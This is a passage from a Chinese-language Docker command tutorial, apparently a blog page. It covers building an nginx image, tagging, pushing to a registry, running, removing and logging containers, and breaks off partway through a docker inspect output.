title="OPTIONS"></a>OPTIONS</h4><h5 id="t"><a href="#t" class="headerlink" title="-t"></a>-t</h5><p>–tag list</p><p>–target string  指定镜像 tag</p><h4 id="PATH"><a href="#PATH" class="headerlink" title="PATH"></a>PATH</h4><p>指定 Dockerfile 路径</p><h4 id="实例-5"><a href="#实例-5" class="headerlink" title="实例"></a>实例</h4><h5 id="编写-Dockerfile-文件"><a href="#编写-Dockerfile-文件" class="headerlink" title="编写 Dockerfile 文件"></a>编写 Dockerfile 文件</h5><p>注意：文件名就是Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">➜  test cat Dockerfile <br><span class="hljs-comment"># 使用官方的 Ubuntu 20.04 镜像作为基础</span><br><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span><br><br><span class="hljs-comment"># 作者信息</span><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> maintainer=<span class="hljs-string">&quot;your-email@example.com&quot;</span></span><br><br><span class="hljs-comment"># 更新 apt 软件包列表并安装一个示例应用程序</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y \</span><br><span class="language-bash">    nginx \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">rm</span> -rf /var/lib/apt/lists/*</span><br><br><span class="hljs-comment"># 将本地文件复制到镜像中</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> index.html /var/www/html/</span><br><br><span class="hljs-comment"># 暴露端口</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span><br><br><span class="hljs-comment"># 定义容器启动时运行的命令</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;nginx&quot;</span>, <span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;daemon off;&quot;</span>]</span><br></code></pre></td></tr></table></figure><h5 id="build镜像"><a href="#build镜像" class="headerlink" title="build镜像"></a>build镜像</h5><p>docker build -t my-nginx-image .</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs ruby">➜  test docker build -t my-nginx-image .<br>[+] <span class="hljs-title class_">Building</span> <span class="hljs-number">74</span>.9s (<span class="hljs-number">8</span>/<span class="hljs-number">8</span>) <span class="hljs-variable constant_">FINISHED</span>                                                                                                                                           <br> =&gt; [internal] load build definition from <span class="hljs-title class_">Dockerfile</span>                                                                                                                   <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; transferring <span class="hljs-symbol">dockerfile:</span> 491B                                                                                                                                   <span class="hljs-number">0</span>.0s<br> =&gt; [internal] load .dockerignore                                                                                                                                      <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; transferring <span class="hljs-symbol">context:</span> 2B                                                                                                                                        <span class="hljs-number">0</span>.0s<br> =&gt; [internal] load metadata for docker.io/library/<span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span>                                                                                                        <span class="hljs-number">1</span>.4s<br> =&gt; [<span class="hljs-number">1</span>/<span class="hljs-number">3</span>] <span class="hljs-variable constant_">FROM</span> docker.io/library/<span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span><span class="hljs-variable">@sha256</span><span class="hljs-symbol">:</span>626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322                                                 <span class="hljs-number">23</span>.4s<br> =&gt; =&gt; resolve docker.io/library/<span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span><span class="hljs-variable">@sha256</span><span class="hljs-symbol">:</span>626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322                                                  <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322 <span class="hljs-number">1</span>.42kB / <span class="hljs-number">1</span>.42kB                                                                         <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>26c3bd3ae441c873a210200bcbb975ffd2bbf0c0841a4584f4476c8a5b8f3d99 529B / 529B                                                                             <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>d5ca7a4456053674d490803005766890dd19e3f7e789a48737c0d462da531f5d <span class="hljs-number">1</span>.48kB / <span class="hljs-number">1</span>.48kB                                                                         <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>a39c84e173f038958d338f55a9e8ee64bb6643e8ac6ae98e08ca65146e668d86 <span class="hljs-number">27</span>.17MB / <span class="hljs-number">27</span>.17MB                                                                      <span class="hljs-number">22</span>.6s<br> =&gt; =&gt; extracting <span class="hljs-symbol">sha256:</span>a39c84e173f038958d338f55a9e8ee64bb6643e8ac6ae98e08ca65146e668d86                                                                              <span class="hljs-number">0</span>.7s<br> =&gt; [internal] load build context                                                                                                                                      <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; transferring <span class="hljs-symbol">context:</span> 255B                                                                                                                                      <span class="hljs-number">0</span>.0s<br> =&gt; [<span class="hljs-number">2</span>/<span class="hljs-number">3</span>] <span class="hljs-variable constant_">RUN</span> apt-get update &amp;&amp; apt-get install -y     nginx     &amp;&amp; rm -rf /var/lib/apt/lists/*                                                                       <span class="hljs-number">49</span>.7s<br> =&gt; [<span class="hljs-number">3</span>/<span class="hljs-number">3</span>] <span class="hljs-variable constant_">COPY</span> index.html /var/www/html/                                                                                                                               <span class="hljs-number">0</span>.0s <br> =&gt; exporting to image                                                                                                                                                 <span class="hljs-number">0</span>.2s <br> =&gt; =&gt; exporting layers                                                                                                                                                <span class="hljs-number">0</span>.2s <br> =&gt; =&gt; writing image <span class="hljs-symbol">sha256:</span>fd09b8e38b0e75b933c83996e55146d4a59e2c62b13c0daec733177186923b39                                                                           <span class="hljs-number">0</span>.0s <br> =&gt; =&gt; naming to docker.io/library/my-nginx-image  <br></code></pre></td></tr></table></figure><h2 id="添加TAG"><a href="#添加TAG" class="headerlink" title="添加TAG"></a>添加TAG</h2><h3 id="docker-tag"><a href="#docker-tag" class="headerlink" title="docker tag"></a>docker tag</h3><p><strong>docker tag 镜像名称:镜像版本 镜像新名称:镜像新版本</strong></p><h4 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h4><p>为镜像设置tag</p><h4 id="OPTIONS-5"><a href="#OPTIONS-5" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h4 id="实例-6"><a href="#实例-6" class="headerlink" title="实例"></a>实例</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># docker images</span><br>REPOSITORY        <span class="hljs-keyword">TAG</span>       <span class="hljs-title">IMAGE</span> ID       CREATED        SIZE<br>grafana/grafana   <span class="hljs-number">8.2</span>.<span class="hljs-number">6</span>     aeeaa96eea83   <span class="hljs-number">9</span> months ago   <span class="hljs-number">253M</span>B<br>grafana/grafana   <span class="hljs-number">6.3</span>.<span class="hljs-number">3</span>     a6e14b4109af   <span class="hljs-number">3</span> years ago    <span class="hljs-number">253M</span>B<br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># docker tag grafana/grafana:8.2.6 grafana:8.2.6.1</span><br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># docker images</span><br>REPOSITORY        <span class="hljs-keyword">TAG</span>       <span class="hljs-title">IMAGE</span> ID       CREATED        SIZE<br>grafana/grafana   <span class="hljs-number">8.2</span>.<span class="hljs-number">6</span>     aeeaa96eea83   <span class="hljs-number">9</span> months ago   <span class="hljs-number">253M</span>B<br>grafana           <span class="hljs-number">8.2</span>.<span class="hljs-number">6.1</span>   aeeaa96eea83   <span class="hljs-number">9</span> months ago   <span class="hljs-number">253M</span>B<br>grafana/grafana   <span class="hljs-number">6.3</span>.<span class="hljs-number">3</span>     a6e14b4109af   <span class="hljs-number">3</span> years ago    <span class="hljs-number">253M</span>B<br></code></pre></td></tr></table></figure><h2 id="上传镜像"><a href="#上传镜像" class="headerlink" title="上传镜像"></a>上传镜像</h2><h3 id="docker-push"><a href="#docker-push" class="headerlink" title="docker push"></a><strong>docker push</strong></h3><p><strong>docker push [OPTIONS] NAME[:TAG]</strong></p><h4 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a>描述</h4><p>上传镜像到远程镜像仓库</p><h4 id="OPTIONS-6"><a href="#OPTIONS-6" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="a"><a href="#a" class="headerlink" title="-a"></a>-a</h5><p>–all-tags 上传所有tag的镜像到仓库</p><p>–disable-content-trust  关闭镜像签名校验，默认校验</p><p>-q</p><p>–quiet Suppress verbose output</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  / docker push registry<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span>.xxx/hours/my-nginx-image:<span class="hljs-number">2.0</span>                                    <br>The push refers to repository <span class="hljs-selector-attr">[registry.xxx.xxx.xxx.xxx/hours/my-nginx-image]</span><br><span class="hljs-number">0</span>c192a2bcb80: Pushed <br>bed1f48a7b1b: Pushed <br><span class="hljs-number">350</span>f36b271de: Layer already exists <br><span class="hljs-number">2.0</span>: digest: sha256:c0b08d64470340b8fc730b795e0d99f78da1595d5443ab97e7b51ab8bd057022 size: <span class="hljs-number">948</span><br>➜  / docker push registry<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span>.xxx/hours/my-nginx-image:<span class="hljs-number">2.0</span> -<span class="hljs-selector-tag">q</span><br>registry<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span>.xxx/hours/my-nginx-image:<span class="hljs-number">2.0</span><br></code></pre></td></tr></table></figure><h5 id="NAME-TAG"><a href="#NAME-TAG" class="headerlink" title="NAME[:TAG]"></a>NAME[:TAG]</h5><p>指定需要上传的镜像名或指定镜像TAG</p><p>不指定TAG，则使用默认TAG：latest</p><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><h6 id="不指定镜像仓库"><a href="#不指定镜像仓库" class="headerlink" title="不指定镜像仓库"></a>不指定镜像仓库</h6><p>默认会上传到 docker.io</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">➜  / docker push my-nginx-image<br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> tag: latest<br>The push refers <span class="hljs-keyword">to</span> repository [docker.io/library/my-nginx-image]<br><span class="hljs-number">0</span>c192a2bcb80: Preparing <br><span class="hljs-symbol">bed1f48a7b1b:</span> Preparing <br><span class="hljs-number">350</span>f36b271de: Preparing <br><span class="hljs-symbol">denied:</span> requested access <span class="hljs-keyword">to</span> the resource <span class="hljs-built_in">is</span> denied<br></code></pre></td></tr></table></figure><h6 id="指定镜像仓库"><a href="#指定镜像仓库" class="headerlink" title="指定镜像仓库"></a>指定镜像仓库</h6><p>仓库域名&#x2F;项目名&#x2F;镜像名[:tag]</p><p>registry.xxx.xxx.xxx.xxx&#x2F;waf&#x2F;my-nginx-image:latest</p><h5 id="实例-7"><a href="#实例-7" class="headerlink" title="实例"></a>实例</h5><p>1、镜像添加tag</p><p>docker tag 镜像名:tag 仓库域名&#x2F;项目名&#x2F;镜像名:tag</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">➜  / docker tag <span class="hljs-keyword">my</span>-nginx-image:latest registry.xxx.xxx.xxx.xxx/hours/<span class="hljs-keyword">my</span>-nginx-image:<span class="hljs-number">2.0</span><br><br>➜  / docker images | <span class="hljs-keyword">grep</span> <span class="hljs-number">2.0</span>     <br>registry.xxx.xxx.xxx.xxx/hours/<span class="hljs-keyword">my</span>-nginx-image     <span class="hljs-number">2.0</span>          fd09b8e38b0e   <span class="hljs-number">5</span> days ago      <span class="hljs-number">123</span>MB<br></code></pre></td></tr></table></figure><p>2、上传镜像</p><p>可能需要登录，如果没有登录会提示（unauthorized: unauthorized to access repository: waf&#x2F;my-nginx-image, action: push: unauthorized to access repository: waf&#x2F;my-nginx-image, action: push）</p><p>docker push 仓库域名&#x2F;项目名&#x2F;镜像名:tag</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl">➜  / docker <span class="hljs-keyword">push</span> registry.xxx.xxx.xxx.xxx/hours/<span class="hljs-keyword">my</span>-nginx-image:<span class="hljs-number">2.0</span>                                    <br>The <span class="hljs-keyword">push</span> refers to repository [registry.xxx.xxx.xxx.xxx/hours/<span class="hljs-keyword">my</span>-nginx-image]<br>0c192a2bcb8<span class="hljs-number">0</span>: Pushed <br>bed1f48a7b1b: Pushed <br><span class="hljs-number">350</span>f36b271de: Layer already <span class="hljs-keyword">exists</span> <br><span class="hljs-number">2.0</span>: digest: sha256:c0b08d64470340b8fc730b795e0d99f78da1595d5443ab97e7b51ab8bd057022 size: <span class="hljs-number">948</span><br></code></pre></td></tr></table></figure><h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><h2 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h2><h3 id="docker-run"><a href="#docker-run" class="headerlink" title="docker run"></a>docker run</h3><p><strong>docker run [OPTIONS] IMAGE [COMMAND] [ARG…]</strong></p><p>docker run -itd  -p port1:port2 -v &#x2F;path:&#x2F;path IMAGE</p><p>dockerdocker二进制文件</p><p>run运行docker容器命令</p><h4 id="描述-9"><a href="#描述-9" class="headerlink" title="描述"></a>描述</h4><p>创建并运行容器</p><h4 id="OPTIONS-7"><a href="#OPTIONS-7" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="–name-Name"><a href="#–name-Name" class="headerlink" title="–name  Name"></a>–name  Name</h5><p>设置容器名称</p><h5 id="i，–interactive"><a href="#i，–interactive" class="headerlink" title="-i，–interactive"></a>-i，–interactive</h5><p>Keep STDIN open even if not attached  为容器创建终端，即使没有连接</p><h5 id="t，–tty"><a href="#t，–tty" class="headerlink" title="-t，–tty"></a>-t，–tty</h5><p>Allocate a pseudo-TTY 为容器分配伪终端，允许你对容器内的标准输入进行交互</p><h5 id="d，–detch"><a href="#d，–detch" class="headerlink" title="-d，–detch"></a>-d，–detch</h5><p>Run container in background and print container ID  创建的容器运行在后台，输出容器id</p><h5 id="–rm"><a href="#–rm" class="headerlink" title="–rm"></a>–rm</h5><p>容器退出时自动清理容器内部的文件系统，不可与 -d 命令同时使用</p><p>只能自动清理 foreground 容器，不可自动清理 detached 容器，也会清理容器的匿名 data volumes</p><p>等价于容器退出后，执行 docker rm -v</p><h5 id="port1"><a href="#port1" class="headerlink" title="port1"></a>port1</h5><p>容器外端口，宿主机端口</p><h5 id="port2"><a href="#port2" class="headerlink" title="port2"></a>port2</h5><p>容器内端口</p><h5 id="IMAGE"><a href="#IMAGE" class="headerlink" title="IMAGE"></a>IMAGE</h5><p>镜像名</p><h5 id="v-path1-path2"><a href="#v-path1-path2" class="headerlink" title="-v &#x2F;path1:&#x2F;path2"></a>-v &#x2F;path1:&#x2F;path2</h5><p>挂载目录  &#x2F;path1 宿主机目录  &#x2F;path2 容器目录，也就是将宿主机挂载到容器中</p><h4 id="COMMAND"><a href="#COMMAND" class="headerlink" title="COMMAND"></a>COMMAND</h4><p>制定执行的命令，例如 &#x2F;bin&#x2F;bash 指定使用的bash</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  docker run -itd -<span class="hljs-keyword">p</span> <span class="hljs-number">8888</span>:<span class="hljs-number">80</span> -v /Users/admin/<span class="hljs-keyword">opt</span>/docker/:/<span class="hljs-keyword">opt</span>/ cento<span class="hljs-variable">s:7</span><br>Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">find</span> image <span class="hljs-string">&#x27;centos:7&#x27;</span> locally<br><span class="hljs-number">7</span>: Pulling from library/centos<br><span class="hljs-number">6717</span>b8ec66cd: Pull <span class="hljs-built_in">complete</span> <br>Digest: <span class="hljs-built_in">sha256</span>:c73f515d06b0fa07bb18d8202035e739a494ce760aa73129f60f4bf2bd22b407<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> cento<span class="hljs-variable">s:7</span><br><span class="hljs-number">0</span>fc471d9378c722e269c16673297223a77f1ba482bd67f0a4ad5f904bc9bd93f<br>➜  docker docker <span class="hljs-keyword">ps</span><br>CONTAINER ID   IMAGE      COMMAND       CREATED         STATUS         PORTS                  NAMES<br><span class="hljs-number">0</span>fc471d9378c   cento<span class="hljs-variable">s:7</span>   <span class="hljs-string">&quot;/bin/bash&quot;</span>   <span class="hljs-number">5</span> seconds ago   Up <span class="hljs-number">5</span> seconds   <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8888</span>-&gt;<span class="hljs-number">80</span>/tcp   gifted_banach<br></code></pre></td></tr></table></figure><h2 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h2><h3 id="docker-rm"><a href="#docker-rm" class="headerlink" title="docker rm"></a>docker rm</h3><p>docker rm id</p><h4 id="描述-10"><a href="#描述-10" class="headerlink" title="描述"></a>描述</h4><p>删除指定容器</p><h4 id="实例-8"><a href="#实例-8" class="headerlink" title="实例"></a>实例</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">(base) root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># docker rm dbea3aafd585</span><br>dbea3aafd585<br></code></pre></td></tr></table></figure><h2 id="查看容器日志"><a href="#查看容器日志" class="headerlink" title="查看容器日志"></a>查看容器日志</h2><p><strong>docker logs [-f] id</strong></p><h3 id="docker-logs"><a href="#docker-logs" class="headerlink" title="docker logs"></a>docker logs</h3><h4 id="描述-11"><a href="#描述-11" class="headerlink" title="描述"></a>描述</h4><p>查看容器的日志信息</p><h4 id="OPTIONS-8"><a href="#OPTIONS-8" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f-1"><a href="#f-1" class="headerlink" title="-f"></a>-f</h5><p>查看实时日志</p><h4 id="实例-9"><a href="#实例-9" class="headerlink" title="实例"></a>实例</h4><p>查看实时日志</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs css">➜  /tmp docker logs -f <span class="hljs-number">61804</span>e0083af<br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br></code></pre></td></tr></table></figure><h2 id="查看容器元数据"><a href="#查看容器元数据" class="headerlink" title="查看容器元数据"></a>查看容器元数据</h2><p><strong>docker inspect [OPTIONS] Name|Id</strong></p><h3 id="docker-inspect-1"><a href="#docker-inspect-1" class="headerlink" title="docker inspect"></a>docker inspect</h3><h4 id="描述-12"><a href="#描述-12" class="headerlink" title="描述"></a>描述</h4><p>查看容器的基础数据</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span> ~]<span class="hljs-meta"># docker inspect 4b0e2ed242e0</span><br>[<br>    &#123;<br>        <span class="hljs-string">&quot;Id&quot;</span>: <span class="hljs-string">&quot;4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1&quot;</span>,<br>        <span class="hljs-string">&quot;Created&quot;</span>: <span class="hljs-string">&quot;2022-09-16T01:30:49.271281387Z&quot;</span>,<br>        <span class="hljs-string">&quot;Path&quot;</span>: <span class="hljs-string">&quot;/run.sh&quot;</span>,<br>        <span class="hljs-string">&quot;Args&quot;</span>: [],<br>        <span class="hljs-string">&quot;State&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Status&quot;</span>: <span class="hljs-string">&quot;running&quot;</span>,<br>            <span class="hljs-string">&quot;Running&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;Paused&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Restarting&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;OOMKilled&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Dead&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Pid&quot;</span>: <span class="hljs-number">1272</span>,<br>            <span class="hljs-string">&quot;ExitCode&quot;</span>: <span class="hljs-number">0</span>,<br>            <span 